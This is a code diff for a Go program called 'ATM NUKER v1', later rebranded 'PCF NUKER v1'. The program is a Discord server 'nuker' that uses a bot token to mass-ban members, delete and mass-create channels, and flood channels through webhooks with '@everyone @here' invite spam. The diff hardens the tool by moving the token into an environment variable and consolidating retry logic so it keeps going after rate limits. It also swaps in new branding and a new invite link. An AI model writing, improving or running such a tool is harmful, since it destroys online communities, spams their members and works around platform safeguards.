@@ -42,11 +42,13 @@ type WebhookConfig struct {
 func main() {
 	fmt.Println("[$] ATM NUKER v1")
 	
-	reader := bufio.NewReader(os.Stdin)
+	token := os.Getenv("TOKEN")
+	if token == "" {
+		fmt.Println("[!] TOKEN environment variable not set.")
+		return
+	}
 
-	fmt.Print("[$] Bot Token: ")
-	token, _ := reader.ReadString('\n')
-	token = strings.TrimSpace(token)
+	reader := bufio.NewReader(os.Stdin)
 
 	fmt.Print("[$] Guild ID: ")
 	guild, _ := reader.ReadString('\n')
@@ -163,18 +165,8 @@ func Send_BanRequest(token, guild, user, reason string) {
 		return 
 	}
 	if resp.StatusCode == 429 {
-
-		retryAfter := resp.Header.Get("Retry-After")
-		if retryAfter != "" {
-			if seconds, err := strconv.Atoi(retryAfter); err == nil {
-				fmt.Printf("[$] Ratelimited for %d seconds\n", seconds)
-				time.Sleep(time.Duration(seconds)*time.Second + 100*time.Millisecond)
-			} else {
-				time.Sleep(100 * time.Millisecond) 
-			}
-		} else {
-			time.Sleep(100 * time.Millisecond) 
-		}
+		fmt.Printf("[$] Ratelimited on ban for %s\n", user)
+		time.Sleep(parseRetryAfter(resp.Header.Get("Retry-After"), 100*time.Millisecond))
 		Send_BanRequest(token, guild, user, reason)
 	} else if resp.StatusCode != 204 {
 		fmt.Printf("Failed to ban %s - Status: %d\n", user, resp.StatusCode)
@@ -248,17 +240,8 @@ func Send_ChannelRequest(token, guild, channel, reason string) {
 		return 
 	}
 	if resp.StatusCode == 429 {
-		retryAfter := resp.Header.Get("Retry-After")
-		if retryAfter != "" {
-			if seconds, err := strconv.Atoi(retryAfter); err == nil {
-				fmt.Printf("[$] Ratelimited for %d seconds\n", seconds)
-				time.Sleep(time.Duration(seconds)*time.Second + 100*time.Millisecond)
-			} else {
-				time.Sleep(100 * time.Millisecond)
-			}
-		} else {
-			time.Sleep(100 * time.Millisecond)
-		}
+		fmt.Printf("[$] Ratelimited on delete for %s\n", channel)
+		time.Sleep(parseRetryAfter(resp.Header.Get("Retry-After"), 100*time.Millisecond))
 		Send_ChannelRequest(token, guild, channel, reason)
 	} else if resp.StatusCode != 200 && resp.StatusCode != 204 {
 		fmt.Printf("Failed to delete %s - Status: %d\n", channel, resp.StatusCode)
@@ -536,17 +519,8 @@ func Send_CreateChannelRequest(token, guild, name string, channelType int) {
 		return
 	}
 	if resp.StatusCode == 429 {
-		retryAfter := resp.Header.Get("Retry-After")
-		if retryAfter != "" {
-			if seconds, err := strconv.Atoi(retryAfter); err == nil {
-				fmt.Printf("[$] Ratelimited for %d seconds\n", seconds)
-				time.Sleep(time.Duration(seconds)*time.Second + 100*time.Millisecond)
-			} else {
-				time.Sleep(1 * time.Second)
-			}
-		} else {
-			time.Sleep(1 * time.Second)
-		}
+		fmt.Printf("[$] Ratelimited on channel create for %s\n", name)
+		time.Sleep(parseRetryAfter(resp.Header.Get("Retry-After"), 1*time.Second))
 		Send_CreateChannelRequest(token, guild, name, channelType)
 	} else {
 		fmt.Printf("Failed to create channel %s - Status: %d\n", name, resp.StatusCode)
@@ -555,10 +529,10 @@ func Send_CreateChannelRequest(token, guild, name string, channelType int) {
 
 func WebhookSpamChannels(token, guild string) {
 	webhookConfig := WebhookConfig{
-		Name:      "ATM NUKER v1",                                               
-		AvatarURL: "https://cdn.discordapp.com/attachments/1076920453928603812/1410103882830315591/IMG_7327.jpg?ex=68b075d4&is=68af2454&hm=8c2db0921e5a53a9ba8ed1479b6e708efb6106350e14059b1d2f270643e09c2f&",  
-		Message:   "@everyone @here discord.gg/draco",                     
-		Username:  "/draco",               
+		Name:      "PCF NUKER v1",                                               
+		AvatarURL: "https://cdn.discordapp.com/attachments/1513668885168132352/1532171537568759898/cropped_circle_image.png?ex=6a6be170&is=6a6a8ff0&hm=ed505220ca82fa3436fd686949684be1e0c475c5a9e249e4db47f2d901c61c10&",  
+		Message:   "@everyone @here discord.gg/gatti101",                     
+		Username:  "@Gatti",               
 	}
 
 	fmt.Print("[$] Channel Name: ")
@@ -673,17 +647,8 @@ func CreateChannelForWebhook(token, guild, name string) string {
 		fmt.Printf("Created channel: %s (ID: %s)\n", name, channel.ID)
 		return channel.ID
 	} else if resp.StatusCode == 429 {
-		retryAfter := resp.Header.Get("Retry-After")
-		if retryAfter != "" {
-			if seconds, err := strconv.Atoi(retryAfter); err == nil {
-				fmt.Printf("Channel creation rate limited for %d seconds\n", seconds)
-				time.Sleep(time.Duration(seconds)*time.Second + 1*time.Second)
-			} else {
-				time.Sleep(5 * time.Second)
-			}
-		} else {
-			time.Sleep(2 * time.Second)
-		}
+		fmt.Printf("Channel creation rate limited for %s\n", name)
+		time.Sleep(parseRetryAfter(resp.Header.Get("Retry-After"), 2*time.Second))
 		return CreateChannelForWebhook(token, guild, name)
 	} else {
 		fmt.Printf("Failed to create channel %s - Status: %d\n", name, resp.StatusCode)
@@ -694,7 +659,12 @@ func CreateChannelForWebhook(token, guild, name string) string {
 func CreateWebhook(token, channelID, name, avatarURL string) string {
 	requestURL := fmt.Sprintf("https://discord.com/api/v10/channels/%s/webhooks", channelID)
 
-	requestBody := fmt.Sprintf(`{"name":"%s"}`, name)
+	var requestBody string
+	if avatarURL != "" {
+		requestBody = fmt.Sprintf(`{"name":"%s","avatar":"%s"}`, name, avatarURL)
+	} else {
+		requestBody = fmt.Sprintf(`{"name":"%s"}`, name)
+	}
 
 	req, err := http.NewRequest("POST", requestURL, strings.NewReader(requestBody))
 	if err != nil {
@@ -729,17 +699,8 @@ func CreateWebhook(token, channelID, name, avatarURL string) string {
 		fmt.Printf("Created webhook for channel: %s\n", name)
 		return webhookURL
 	} else if resp.StatusCode == 429 {
-		retryAfter := resp.Header.Get("Retry-After")
-		if retryAfter != "" {
-			if seconds, err := strconv.Atoi(retryAfter); err == nil {
-				fmt.Printf("Webhook creation rate limited for %d seconds\n", seconds)
-				time.Sleep(time.Duration(seconds)*time.Second + 1*time.Second)
-			} else {
-				time.Sleep(5 * time.Second)
-			}
-		} else {
-			time.Sleep(2 * time.Second)
-		}
+		fmt.Printf("Webhook creation rate limited for %s\n", name)
+		time.Sleep(parseRetryAfter(resp.Header.Get("Retry-After"), 2*time.Second))
 		return CreateWebhook(token, channelID, name, avatarURL)
 	} else {
 		fmt.Printf("Failed to create webhook for %s - Status: %d\n", name, resp.StatusCode)
@@ -748,14 +709,16 @@ func CreateWebhook(token, channelID, name, avatarURL string) string {
 }
 
 func SendWebhookMessage(webhookURL string, config WebhookConfig) {
-	var requestBody string
+	payload := map[string]string{"content": config.Message}
 	if config.Username != "" {
-		requestBody = fmt.Sprintf(`{"content":"%s","username":"%s"}`, config.Message, config.Username)
-	} else {
-		requestBody = fmt.Sprintf(`{"content":"%s"}`, config.Message)
+		payload["username"] = config.Username
+	}
+	bodyBytes, err := json.Marshal(payload)
+	if err != nil {
+		return
 	}
 
-	req, err := http.NewRequest("POST", webhookURL, strings.NewReader(requestBody))
+	req, err := http.NewRequest("POST", webhookURL, strings.NewReader(string(bodyBytes)))
 	if err != nil {
 		return
 	}
@@ -769,16 +732,19 @@ func SendWebhookMessage(webhookURL string, config WebhookConfig) {
 	defer resp.Body.Close()
 
 	if resp.StatusCode == 429 {
-		retryAfter := resp.Header.Get("Retry-After")
-		if retryAfter != "" {
-			if seconds, err := strconv.Atoi(retryAfter); err == nil {
-				time.Sleep(time.Duration(seconds)*time.Second + 100*time.Millisecond)
-			} else {
-				time.Sleep(1 * time.Second)
-			}
-		} else {
-			time.Sleep(500 * time.Millisecond)
-		}
+		sleepDuration := parseRetryAfter(resp.Header.Get("Retry-After"), 500*time.Millisecond)
+		time.Sleep(sleepDuration)
 		SendWebhookMessage(webhookURL, config)
 	}
+}
+
+// parseRetryAfter parses Discord's Retry-After header, which can be a float (e.g. "1.234").
+func parseRetryAfter(header string, fallback time.Duration) time.Duration {
+	if header == "" {
+		return fallback
+	}
+	if secs, err := strconv.ParseFloat(header, 64); err == nil {
+		return time.Duration(secs*1000)*time.Millisecond + 100*time.Millisecond
+	}
+	return fallback
 }
